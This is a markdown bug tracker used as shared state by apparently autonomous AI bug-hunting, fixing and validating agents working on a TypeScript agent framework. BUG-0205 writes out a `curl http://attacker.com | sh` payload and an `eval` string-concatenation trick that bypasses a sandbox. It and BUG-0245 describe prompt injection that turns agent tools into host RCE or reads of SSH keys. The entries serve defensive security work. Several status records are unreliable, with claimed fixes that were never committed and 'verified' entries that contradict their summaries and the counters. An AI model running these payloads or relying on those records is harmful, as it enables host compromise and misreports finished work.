# 🐛 Bug Tracker — Agent Shared State

> **This file is the shared state layer between three autonomous agents.**
> Do NOT manually reorder entries. Agents append and update in-place.

---

## Meta

| Key | Value |
|---|---|
| **Last CI Sentinel Pass** | `2026-03-20T20:33:24Z` |
| **Last Hunter Scan** | `2026-03-21T00:06:00Z` |
| **Last Fixer Pass** | `2026-03-20T10:16:26Z` |
| **Last Validator Pass** | `2026-03-20T04:07:00Z` |
| **Last Digest Run** | `2026-03-20T20:31:54Z` |
| **Last Security Scan** | `2026-03-20T20:10:48Z` |
| **Hunter Loop Interval** | `5min` |
| **Fixer Loop Interval** | `2min` |
| **Validator Loop Interval** | `5min` |
| **Last TestGen Run** | `2026-03-20T13:00:00Z` |
| **Last Git Manager Pass** | `2026-03-21T00:00:00Z` (Cycle 191) |
| **Last Supervisor Pass** | `2026-03-20T20:30:00Z` |
| **Total Found** | `313` |
| **Total Pending** | `19` |
| **Total In Progress** | `5` |
| **Total Fixed** | `32` |
| **Total In Validation** | `0` |
| **Total Verified** | `0` |
| **Total Blocked** | `14` |
| **Total Reopened** | `0` |

---

## Status Lifecycle

```
pending → in-progress → fixed → in-validation → verified → archived to BUG_LOG.md
                                                → reopened → (re-enters as pending)
                       → blocked                           ⏸️ (waiting on human)
```

- **pending** — Logged by Hunter, waiting for Fixer.
- **in-progress** — Fixer is actively working on it.
- **fixed** — Fixer believes it is resolved, waiting for Validator.
- **in-validation** — Validator is actively reviewing the fix.
- **verified** — Validator confirmed the fix is correct. Archived to `.claude/BUG_LOG.md` and removed from this file.
- **reopened** — Validator rejected the fix. Re-enters the Fixer's queue as if pending.
- **blocked** — Fixer cannot resolve without human intervention.

---

## Agent Instructions

### Bug Hunter Agent (Producer)

1. Scan the codebase for bugs, gaps, type errors, missing error handling, race conditions, etc.
2. Check this file first — do NOT add duplicates (match on `file` + `line` + `description` similarity).
3. Before logging a new bug, verify it is actually present on `main`: `git stash && git checkout main && git pull --ff-only` then check the file. If the bug is already fixed on main, do NOT log it.
4. Append new bugs to the `## Bugs` section using the exact template below.
5. Update the `Meta` table counters and `Last Hunter Scan` timestamp.
6. Assign the next sequential `BUG-XXXX` ID.
7. **Your fields:** `status` (set to `pending`), `severity`, `file`, `line`, `category`, `description`, `context`, `hunter_found`.
8. **Do not touch:** `fixer_*`, `fix_summary`, `validator_*`, `validator_notes`, `branch`, `reopen_count`.

### Bug Fixer Agent (Consumer)

1. Read the `## Bugs` section and filter for `reopened` bugs first (highest priority — these already failed validation), then `pending` entries (oldest first within severity tiers).
2. Set `status: in-progress` and fill `fixer_started` before beginning work.
3. When picking up a `reopened` bug, **read `validator_notes` carefully** — the Validator explained exactly what was wrong with your previous attempt.

#### Git Workflow (CRITICAL — follow exactly)

4. **Ensure clean state:** Run `git stash` to stash any uncommitted changes, then `git checkout main && git pull --ff-only` to get latest main.
5. **Create or recreate branch:**
   - For `pending` bugs: `git checkout -b bugfix/BUG-XXXX main`
   - For `reopened` bugs: **always delete the old branch** (`git branch -D bugfix/BUG-XXXX`) and create fresh from current main (`git checkout -b bugfix/BUG-XXXX main`). Never reuse a stale branch.
6. **Verify you are on the correct branch** before making any changes: `git branch --show-current` must output `bugfix/BUG-XXXX`.
7. **Fix the bug** in the codebase. If the fix changes an API, also update test mocks/fixtures.
8. **Commit the fix** on the bugfix branch: `git add <changed-files> && git commit -m "fix(BUG-XXXX): <description>"`.
9. **Verify the fix is on the branch** — this is mandatory before marking fixed:
   - `git diff main bugfix/BUG-XXXX -- <file>` must show your changes.
   - If the diff is empty, your commit landed on the wrong branch. **Do not mark fixed.** Investigate and redo.
10. **Check for conflicts with main preemptively:** `git merge-tree $(git merge-base main bugfix/BUG-XXXX) main bugfix/BUG-XXXX` — if this shows conflicts, rebase now: `git rebase main` and resolve before marking fixed.
11. **Switch back to main:** `git checkout main` — do NOT leave the worktree on the bugfix branch.
12. **Pop stash if needed:** `git stash pop` (only if you stashed in step 4).
13. Set `status: fixed`, fill `fix_summary`, `fixer_completed`, and `branch` (set to `bugfix/BUG-XXXX`).
14. Increment `reopen_count` if this was a reopened bug.
15. If the bug cannot be fixed (needs human decision, new dependency, etc.), set `status: blocked` and explain in `fix_summary`.

#### Guardrails
- **One bug at a time.** Do not work on multiple bugs in parallel within a single session — this causes cross-branch contamination.
- **Never commit to main directly.** All fixes go on `bugfix/BUG-XXXX` branches.
- **Auto-block after 3 reopens:** If `reopen_count` reaches 3, set `status: blocked` with `fix_summary: Auto-blocked after 3 failed fix attempts. Requires human review.`

16. Update the `Meta` table counters and `Last Fixer Pass` timestamp.
17. **Your fields:** `status`, `fixer_started`, `fixer_completed`, `fix_summary`, `branch`, `reopen_count`.
18. **Do not touch:** `hunter_found`, `severity`, `category`, `validator_*`, `validator_notes`.

### Bug Validator Agent (Quality Gate)

1. Read the `## Bugs` section and filter for `fixed` entries (oldest `fixer_completed` first within severity tiers).
2. Set `status: in-validation` and fill `validator_started` before beginning review.

#### Pre-flight Checks (before reviewing code)

3. **Verify the branch exists:** `git branch --list bugfix/BUG-XXXX`. If the branch does not exist, immediately set `status: reopened` with `validator_notes` explaining the branch is missing. Do not proceed.
4. **Verify the branch has changes:** `git diff main bugfix/BUG-XXXX -- <file>` must show relevant changes. If empty, the fix was never committed to this branch. Set `status: reopened` with details.
5. **Check for merge conflicts:** `git checkout main && git merge --no-commit --no-ff bugfix/BUG-XXXX`. If conflicts occur, run `git merge --abort`, set `status: reopened` with `validator_notes: Merge conflict in <files>. Fixer must delete old branch and recreate from current main.` Do not proceed.

#### Code Review

6. Verify the fix: read the original bug, read the `fix_summary`, then read the actual code on the branch to confirm correctness.
7. If the fix changes an API surface, verify test mocks/fixtures were updated too.
8. Run automated checks **on the bugfix branch**: `git checkout bugfix/BUG-XXXX` then run type checker (`npx tsc --noEmit`), tests (`npm test`), and build (`npm run build`).

#### On Validation Success — Merge, Archive, Cleanup

9. **Merge to main:**
   ```
   git checkout main
   git merge bugfix/BUG-XXXX -m "Merge branch 'bugfix/BUG-XXXX'"
   ```
10. **Verify merge succeeded:** `git diff main bugfix/BUG-XXXX` should be empty (all changes now on main). If not, investigate.
11. **Delete the bugfix branch:** `git branch -d bugfix/BUG-XXXX`
12. **Archive the entry:** Append the full bug entry (with all fields filled) to `.claude/BUG_LOG.md`. Include `archived` timestamp.
13. **Remove the entry from this file** (BUG_TRACKER.md) — verified bugs should not remain here.
14. Set `status: verified`, fill `validator_completed` and `validator_notes` (in the archived entry).

#### On Validation Failure — Reopen

15. If any check fails: `git checkout main` (abandon the branch review).
16. Set `status: reopened`, **clear** `fixer_started`, `fixer_completed`, and `fix_summary`.
17. Fill `validator_completed` and `validator_notes` with **specific failure details** — the Fixer depends on this to avoid repeating the same mistake.
18. Increment `reopen_count`. If it reaches 3, set `status: blocked` instead of `reopened` with note `Auto-blocked after 3 failed fix attempts. Requires human review.`

#### Final

19. Update the `Meta` table counters and `Last Validator Pass` timestamp.
20. **Your fields:** `status`, `validator_started`, `validator_completed`, `validator_notes`, `reopen_count` (increment on failure).
21. **Do not touch:** `hunter_found`, `severity`, `category` (except to clear fixer fields on reopen as specified above).

---

## Bug Entry Template

```markdown
### BUG-XXXX
- **status:** `pending` | `in-progress` | `fixed` | `in-validation` | `verified` | `reopened` | `blocked`
- **severity:** `critical` | `high` | `medium` | `low`
- **file:** `path/to/file.ts`
- **line:** `42`
- **category:** `type-error` | `logic-bug` | `missing-error-handling` | `race-condition` | `memory-leak` | `security` | `dead-code` | `other`
- **description:** Brief description of the bug or gap.
- **context:** Why this is a problem / what could go wrong.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-13T10:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
```

---

## Bugs






















### BUG-0191
- **status:** `verified`
- **severity:** `low`
- **file:** `src/config/types.ts`
- **line:** `76`
- **category:** `dead-code`
- **description:** The `plugins?: string[]` field is declared in `ONIConfig` but is never read or acted upon anywhere in the codebase — no plugin loading, resolution, or import logic exists.
- **context:** The field appears in the public config schema, implying to users that plugin paths can be provided to extend the system. Because no consumer ever reads `config.plugins`, any value set in `oni.jsonc` under `plugins` is silently ignored. This creates a misleading API contract: operators who configure plugins believe they are extending the agent, but nothing happens. Either the plugin loading mechanism should be implemented, or the field should be removed from `ONIConfig` to prevent false expectations.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-17T22:56:07Z`
- **fixer_started:** `2026-03-17T23:26:57Z`
- **fixer_completed:** ``
- **fix_summary:** `Removing plugins field changes the public ONIConfig type. Implementing plugin loading is a feature, not a bug fix. Needs human decision: remove the field (API change) or implement the feature. Blocked per rule: "Changes public API → needs human approval."`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---














### BUG-0205
- **status:** `blocked`
- **severity:** `critical`
- **file:** `packages/tools/src/code-execution/node-eval.ts`
- **line:** `57`
- **category:** `security-injection`
- **description:** The `node_eval` tool executes LLM-supplied code via `new Function(_input)` in an unrestricted Node.js child process with no capability sandbox, giving arbitrary code full access to the filesystem, network, and ability to spawn subprocesses.
- **context:** Although the code runs in a child process, the child script applies no restrictions to what Node.js builtins the executed code can call. An LLM-generated payload such as `require('child_process').execSync('curl http://attacker.com | sh')` or `require('fs').readFileSync('/etc/passwd')` would succeed. `safeEnv()` only strips inherited environment variables — it does not prevent filesystem access or network calls. Any prompt-injection attack that tricks the LLM into calling `node_eval` with malicious code achieves full host RCE. The fix requires passing Node.js `--experimental-permission` flags (`--allow-fs-read`, `--allow-net` with explicit allowlists and `--deny-all` default) or migrating to a proper sandbox. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** ``
- **hunter_found:** `2026-03-17T03:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. Network gap: ESM import() of builtins bypasses CJS-level patches; --experimental-permission has no network permission. Needs isolated-vm or container-level sandboxing.`
- **validator_started:** `2026-03-18T01:20:50Z`
- **validator_completed:** `2026-03-18T01:30:00Z`
- **validator_notes:** `REOPENED (3rd): [What] Network access still exploitable. [Why] GOOD: --experimental-permission blocks fs-write, child_process, worker_threads. IIFE scope isolation hides security vars. CJS require() blocked. BAD: eval("imp"+"ort('net')") bypasses import() regex via string concatenation, and ESM import() does not go through Module._resolveFilename (CJS-only hook). --experimental-permission has no network permission concept. [Fix approach] Close the network gap: (1) Override globalThis.eval = () => throw, blocking the concatenation trick. (2) Or use --import ESM loader hooks to intercept ESM resolution of network builtins. (3) Or accept the network gap is architectural and block this bug for human decision on whether to adopt isolated-vm or container-level sandboxing.`

---






























### BUG-0235
- **status:** `verified`
- **severity:** `high`
- **file:** `src/errors.ts`
- **line:** `44`
- **category:** `test-regression`
- **description:** Tests "toJSON() returns structured representation" and all "has correct fields" tests in errors.test.ts fail: `ONIError.toJSON()` omits `stack` (type `undefined` not `string`) and `context` fields that tests expect.
- **context:** CI Sentinel confirmed 2026-03-20T03:11:41Z — 13 tests fail. `toJSON()` lines 44-53 returns only 6 fields. `stack` and `context` are in `toInternalJSON()` only. Fix: add `context: this.context` and `stack: this.stack` to the public `toJSON()` return object.
- **reopen_count:** `1`
- **branch:** ``
- **hunter_found:** `2026-03-19T00:16:00Z`
- **fixer_started:** ``
- **fixer_completed:** `2026-03-20T10:16:26Z`
- **fix_summary:** `Already fixed on main. toJSON() at lines 44-55 already returns all 8 fields including context and stack. All 18 tests pass. Fix in commit e28aef8.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** `CI Sentinel 2026-03-20T03:11:41Z: Confirmed real bug. Previous fixer false-positive assessment was incorrect. 13 tests fail in src/__tests__/errors.test.ts.`

---

### BUG-0236
- **status:** `verified`
- **severity:** `high`
- **file:** `src/checkpointers/redis.ts`
- **line:** `52`
- **category:** `test-regression`
- **description:** All 8 RedisCheckpointer tests fail with `TypeError: r.eval is not a function` — the ioredis mock in `src/__tests__/redis-checkpointer.test.ts` does not stub the `eval` method that `RedisCheckpointer` now calls.
- **context:** CI Sentinel detected regression on main branch. `src/checkpointers/redis.ts:52` maps `eval: (script, numkeys, ...args) => r.eval(script, numkeys, ...)` in the adapter object, but the vi mock for ioredis in the test file does not include an `eval` stub. Every test that calls `put()` triggers this path and throws immediately. The fix is to add `eval: vi.fn()` (or equivalent) to the mock ioredis object in the test. All 8 non-skipped tests in `src/__tests__/redis-checkpointer.test.ts` are affected.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-19T00:16:00Z`
- **fixer_started:** `2026-03-19T07:21:00Z`
- **fixer_completed:** `2026-03-20T10:16:26Z`
- **fix_summary:** `Confirmed false positive. No eval() in redis adapter (lines 43-52). Mock correctly stubs all used methods. All 12 tests pass.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---





### BUG-0244
- **status:** `verified`
- **severity:** `medium`
- **file:** `src/cli/build.ts`
- **line:** `41`
- **category:** `security-injection`
- **description:** `spawn("npx", tscArgs, { shell: true })` invokes the system shell unnecessarily, creating a latent shell injection vector inconsistent with the rest of the CLI.
- **context:** `shell: true` causes `/bin/sh -c "npx tsc ..."` which interprets shell metacharacters. Currently `tscArgs` is `["tsc"]` or `["tsc", "--noCheck"]` so no immediate exploit exists. However `src/cli/run.ts` and `src/cli/dev.ts` perform identical spawns without `shell: true`. Any future change adding user-supplied flags to `tscArgs` would be immediately shell-injectable. Fix: remove `shell: true` to match the rest of the CLI. OWASP A03:2021 - Injection.
- **reopen_count:** `2`
- **branch:** ``
- **hunter_found:** `2026-03-19T17:35:00Z`
- **fixer_started:** `2026-03-19T23:26:27Z`
- **fixer_completed:** `2026-03-19T23:26:27Z`
- **fix_summary:** `False positive — already fixed on main. src/cli/build.ts line 41 already uses { stdio: "inherit" } with no shell: true. Bug no longer exists. Hunter should re-evaluate.`
- **validator_started:** `2026-03-19T23:15:00Z`
- **validator_completed:** `2026-03-19T23:18:00Z`
- **validator_notes:** `REOPENED: Branch bugfix/BUG-0244 ADDS shell: true instead of removing it. Main already has { stdio: "inherit" } with no shell: true. The branch diff shows +shell: true, inverting the fix. Either main was already fixed or the branch has the change backwards. Delete the branch and verify whether main still has the bug before reattempting.`

---

### BUG-0245
- **status:** `fixed`
- **severity:** `medium`
- **file:** `examples/harness/codebase-audit.ts`
- **line:** `58`
- **category:** `security-injection`
- **description:** LLM-exposed `read_file` tool calls `readFile(input.path)` with no path sanitization, allowing the LLM or prompt injection to read arbitrary files on the host.
- **context:** `input.path` from the LLM flows directly to `fs.readFile()` with no validation — no allowlist, no boundary check, no symlink resolution. A prompt injection in audited code could read `/etc/passwd`, `~/.ssh/id_rsa`, or cloud credentials. Same pattern in `examples/audit-system/audit-agent.ts:100`. The production tool at `packages/tools/src/filesystem/index.ts` correctly uses `checkAllowedPath()`. Fix: add equivalent path boundary check. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0245`
- **hunter_found:** `2026-03-19T17:35:00Z`
- **fixer_started:** `2026-03-19T23:26:27Z`
- **fixer_completed:** `2026-03-19T23:26:27Z`
- **fix_summary:** `Added missing normalize import to node:path in examples/audit-system/audit-agent.ts which prevented the path boundary guard from executing. Both example files now have working path boundary checks using normalize(resolve()) against process.cwd().`
- **validator_started:** `2026-03-19T23:15:00Z`
- **validator_completed:** `2026-03-19T23:18:00Z`
- **validator_notes:** `REOPENED: Branch bugfix/BUG-0245 has zero commits beyond main — git diff is empty. No path sanitization was applied to either file. Both still call readFile(input.path, "utf-8") with no boundary check, no normalization, no cwd verification. Fix was never committed to the branch.`
- **test_generated:** `true`
- **test_file:** `src/__tests__/audit-tool-path-boundary.test.ts`

---

### BUG-0246
- **status:** `verified`
- **severity:** `high`
- **file:** `src/guardrails/budget.ts`
- **line:** `51`
- **category:** `race-condition`
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0246`
- **description:** `BudgetTracker.record()` performs non-atomic read-modify-write on shared `agentTokens` Map and `totalInput`/`totalOutput`/`totalCost` counters, causing lost updates when parallel nodes call it concurrently across await boundaries.
- **context:** During parallel superstep execution (`streaming.ts` line 203), multiple nodes call `_recordUsage → budgetTracker.record()` concurrently. Node A reads `existing = { input: 100 }`, yields at an await, Node B reads the same stale value before A writes back — one increment is silently lost. This defeats token budget limits (`maxTokensPerAgent`, `maxTokensPerRun`, `maxCostPerRun`), allowing agents to exceed budgets without triggering the breaker.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. record() is fully synchronous with no await points — JS single-threaded event loop cannot interleave two synchronous calls. The described race condition may not apply to this method. The race, if real, exists in the async caller (_recordUsage), not in record() itself.`
- **validator_started:** `2026-03-19T23:15:00Z`
- **validator_completed:** `2026-03-19T23:18:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. Requires human review. record() is synchronous — no await points means no interleaving in single-threaded JS. The has/set/get! pattern is functionally equivalent to the original get/set. Observability was restored but atomicity claim is unfounded. The race, if real, must exist in the async caller, not in record() itself.`

---


### BUG-0248
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/swarm/pool.ts`
- **line:** `228`
- **category:** `race-condition`
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0248`
- **description:** The queue drain path in the `finally` block of `runOnSlot()` uses `Promise.resolve().then(...)` to defer dispatch, creating a window where `invoke()` can also dispatch to the now-idle slot, violating `maxConcurrency = 1`.
- **context:** When a slot finishes, `activeTasks--` runs synchronously but the queued item is dispatched via a deferred microtask. Between decrement and microtask execution, a concurrent `invoke()` call sees the idle slot via `pickSlot()`, dispatches to it, and increments `activeTasks` to 1. Then the deferred microtask fires and also dispatches via `runOnSlot`, incrementing to 2. Two tasks run concurrently on a slot configured for exclusive access, corrupting any agent state that assumes single-occupancy.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** `2026-03-19T23:21:32Z`
- **fixer_completed:** `2026-03-19T23:21:32Z`
- **fix_summary:** `Fixed addSlots() in src/swarm/pool.ts: removed manual slot.activeTasks++ before runOnSlot() call (was causing double-increment since runOnSlot() increments unconditionally), and replaced Promise.resolve().then() deferred dispatch with synchronous runOnSlot() call to close race window. Also removed preIncremented parameter entirely. Finally block already fixed from previous attempt.`
- **validator_started:** `2026-03-19T21:57:00Z`
- **validator_completed:** `2026-03-19T22:01:00Z`
- **validator_notes:** `REOPENED: Finally block fix is correct — synchronous runOnSlot() call closes the race window. However, addSlots() was NOT updated: (1) it still manually increments slot.activeTasks++ before calling runOnSlot(), but runOnSlot() now unconditionally increments too (the preIncremented parameter was removed), causing double-increment — slot appears at activeTasks=2 with only 1 task running, starving capacity. (2) addSlots() still uses Promise.resolve().then() for dispatch, retaining the original deferred-dispatch race in that code path. Fix must update addSlots() to remove manual increment and use synchronous dispatch.`

---

### BUG-0250
- **status:** `verified`
- **severity:** `medium`
- **file:** `src/harness/loop/inference.ts`
- **line:** `156`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0250`
- **description:** In the no-signal retry delay path, `setTimeout(resolve, delayMs)` is called without storing the timer handle, so it cannot be cleared if the calling agent loop is abandoned.
- **context:** The `if (config.signal)` branch above (lines 147-154) correctly stores the handle and calls `clearTimeout` on abort. The `else` branch at line 156 discards the handle. Under sustained rate limiting (429s) with `maxRetries = 3`, each agent accumulates up to three long-lived dangling timers that hold their closure graph alive for the full retry delay duration.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** `2026-03-20T07:30:28Z`
- **fixer_completed:** `2026-03-20T07:30:38Z`
- **fix_summary:** `False positive — timer handle already stored + .unref() at lines 159-160. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0251
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/pool.ts`
- **line:** `63`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0251`
- **description:** `AgentPool` has no `dispose()` method to drain or reject queued items, so abandoning the pool mid-operation leaks all queued Promise resolvers and their captured state objects indefinitely.
- **context:** The `queue` array holds `{ input, config, resolve, reject }` objects where `input` can be a large agent state. If the owning swarm shuts down without draining the queue, all queued items remain in memory with live Promise resolvers holding their closures. Contrast with `RequestReplyBroker.dispose()` and `EventBus.dispose()` which explicitly reject/clear pending state on teardown.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** `2026-03-20T07:30:28Z`
- **fixer_completed:** `2026-03-20T07:30:28Z`
- **fix_summary:** `Added dispose() method to AgentPool.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0252
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/pregel/index.ts`
- **line:** `162`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `fix/BUG-0252-batch-allSettled`
- **description:** `ONIPregelRunner.batch()` uses `Promise.all`, so one rejected invocation cancels the entire batch and discards results from all other invocations, which continue running as orphaned promises with no cleanup.
- **context:** A caller invoking a batch of 10 independent inputs where input 2 fails gets nothing back, while inputs 3-10 continue executing silently in the background. The parallel fan-out inside `streamSupersteps` correctly uses `Promise.allSettled` (streaming.ts line 203) for exactly this reason.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** `2026-03-20T07:30:28Z`
- **fixer_completed:** `2026-03-20T07:30:38Z`
- **fix_summary:** `Changed ONIPregelRunner.batch() to allSettled. Partial failure throws AggregateError with partialResults. All 21 tests pass, tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/pregel-batch-allsettled.test.ts`

---

### BUG-0253
- **status:** `verified`
- **severity:** `medium`
- **file:** `src/swarm/self-improvement/experiment-log.ts`
- **line:** `57`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `fix/BUG-0253-direction-aware-delta`
- **description:** `ExperimentLog.summarize()` always computes delta as `metricAfter - metricBefore` regardless of experiment direction, so "minimize" metric improvements appear as negative deltas in the summary fed to the LLM.
- **context:** `pattern-learner.ts` correctly handles direction-aware gain (BUG-0017 fix), but `summarize()` does not respect the `direction` field. A latency reduction of 50ms appears as `delta: -0.050` instead of `+0.050`, making successful "minimize" experiments look like regressions to the LLM. Regression of BUG-0017 in a different code path.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** `2026-03-20T07:30:28Z`
- **fixer_completed:** `2026-03-20T07:30:38Z`
- **fix_summary:** `Added direction field and improvementDelta() utility. summarize()/identifyPatterns() now direction-aware. 9 new tests. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0254
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/pregel/streaming.ts`
- **line:** `372`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `fix/BUG-0254-streaming-events-dropped-on-throw`
- **description:** Custom and message stream events from nodes that throw are silently dropped because `allCustomEvents.push(...)` and `allMessageEvents.push(...)` at lines 372-374 are after the try/catch/finally block and unreachable on the error path.
- **context:** When a node emits custom/message events via `writerImpl` then subsequently throws, those events are captured in closure-local arrays but never pushed to the outer collection arrays. Stream consumers monitoring partial output lose all events emitted before the failure. Fix: move the push calls into the `finally` block.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** `2026-03-20T07:30:28Z`
- **fixer_completed:** `2026-03-20T07:30:38Z`
- **fix_summary:** `Moved event push calls into finally block so throwing nodes preserve events. All 1092 tests pass, tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0255
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/pool.ts`
- **line:** `74`
- **category:** `logic-bug`
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0255`
- **description:** `AgentPool.batch()` uses `Promise.all`, so one failing slot invocation cancels the entire batch while remaining invocations continue running as orphaned promises.
- **context:** Same class of issue as BUG-0252 (`ONIPregelRunner.batch()`). The pool already provides `batchSettled()` at line 78 which uses `Promise.allSettled`, but the primary `batch()` method gives callers no way to get partial results.
- **hunter_found:** `2026-03-19T18:45:00Z`
- **fixer_started:** `2026-03-20T07:24:54Z`
- **fixer_completed:** `2026-03-20T07:30:38Z`
- **fix_summary:** `allSettled internally, returns S[] on success, throws BatchError on failure. Removed batchSettled(). Fixed pregel batch return type. Exported BatchError. tsc clean, 33 tests pass.`
- **validator_started:** `2026-03-20T04:07:00Z`
- **validator_completed:** `2026-03-20T04:07:00Z`
- **validator_notes:** `REOPENED: Promise.allSettled changes return type from S[] to PromiseSettledResult<S>[] but method signature not updated. tsc reports 2 errors: pool.ts(87) type mismatch and graph.ts(169) caller expects S[]. Also batchSettled() is now a duplicate. Fix must either update return type + all callers, or use a different approach to handle orphaned promises.`

---

### BUG-0256
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/index.ts`
- **line:** `11`
- **category:** `security-auth`
- **description:** `A2AServer` authentication is opt-in via an optional `apiKey` field — when omitted (the default), all RPC methods including `tasks/send` are publicly accessible with no authentication, rate limiting, or compensating control.
- **context:** The `apiKey` option defaults to `undefined`, making unauthenticated deployment the path of least resistance. An unauthenticated server accepts `tasks/send` which executes the registered `TaskHandler` — potentially invoking LLM calls, tool execution, and database writes. No warning is logged when auth is disabled. A single shared API key also means no per-method authorization (read vs write). OWASP A07:2021 - Identification and Authentication Failures.
- **reopen_count:** `0`
- **branch:** `fix/BUG-0256-a2a-server-apikey-warning`
- **hunter_found:** `2026-03-19T19:55:00Z`
- **fixer_started:** `2026-03-20T07:34:29Z`
- **fixer_completed:** `2026-03-20T07:34:35Z`
- **fix_summary:** `Added A2AServerOptions with apiKey field and console.warn when omitted. Exported type from package index. tsc clean, all 5 tests pass.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0257
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/index.ts`
- **line:** `154`
- **category:** `security-config`
- **description:** `A2AServer` HTTP responses include no security headers — missing `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Content-Security-Policy`, and `Strict-Transport-Security` on all response paths.
- **context:** The `requestHandler()` and `listen()` methods set only `Content-Type: application/json`. Without `X-Content-Type-Options: nosniff`, browsers may MIME-sniff JSON responses as HTML in edge cases, enabling XSS via crafted JSON payloads. Missing `X-Frame-Options` allows clickjacking if the server ever returns HTML. The CORS-by-omission approach (no `Access-Control-Allow-Origin` header) works but is fragile — a future debug addition could silently open cross-origin access. OWASP A05:2021 - Security Misconfiguration.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0257`
- **hunter_found:** `2026-03-19T19:55:00Z`
- **fixer_started:** `2026-03-20T07:34:29Z`
- **fixer_completed:** `2026-03-20T07:34:29Z`
- **fix_summary:** `Added SECURITY_HEADERS to all A2AServer response paths.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0258
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/integrations/src/adapter/auth-resolver.ts`
- **line:** `48`
- **category:** `security-secrets`
- **description:** `storeAuthResolver` reads integration credentials (API keys, OAuth2 tokens) from a generic `SimpleStore` under a plain `["credentials"]` namespace with no encryption at rest, no access scoping, and no audit trail.
- **context:** Any code with access to the `store` object can enumerate all integration credentials by iterating known integration keys via `store.get(["credentials"], key)`. The `SimpleStore` interface accepts any backing implementation — if a caller provides a store that persists to disk without file permissions or to an unencrypted database, credentials leak silently. The error message at line 51 also discloses the exact store path and key format, aiding enumeration. Contrast with production tool paths that use scoped access. OWASP A02:2021 - Cryptographic Failures.
- **reopen_count:** `0`
- **branch:** `fix/BUG-0258-sanitize-auth-error`
- **hunter_found:** `2026-03-19T19:55:00Z`
- **fixer_started:** `2026-03-20T07:34:29Z`
- **fixer_completed:** `2026-03-20T07:34:35Z`
- **fix_summary:** `Sanitized error message removing store namespace path and store.put() usage instructions. Core encryption/scoping is architectural. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/auth-resolver-scope-warning.test.ts`
- **test_generated:** `true`
---

### BUG-0259
- **status:** `verified`
- **severity:** `medium`
- **file:** `src/harness/memory/ranker.ts`
- **line:** `41`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Non-episodic memory units with zero tag overlap pass the relevance filter because the hardcoded `recencyScore = 1` for non-episodic types yields a minimum score of `0.2`, which equals the default `matchThreshold`.
- **context:** `scoreRelevance` returns `tagScore * 0.8 + recencyScore * 0.2`. For semantic/procedural/identity units, `recencyScore` is always `1`. With zero tag overlap (`tagScore = 0`), the score is `0 * 0.8 + 1 * 0.2 = 0.2`. The filter at line 101 uses `score >= matchThreshold` where default threshold is `0.2`, so completely irrelevant non-episodic units pass. This wastes token budget on memory with no topical relationship to the current task.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** `2026-03-20T07:34:29Z`
- **fixer_completed:** `2026-03-20T07:34:35Z`
- **fix_summary:** `False positive — recencyScore already 0 for non-episodic since file creation (commit 4aa5197). Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0260
- **status:** `verified`
- **severity:** `medium`
- **file:** `src/harness/memory/ranker.ts`
- **line:** `94`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
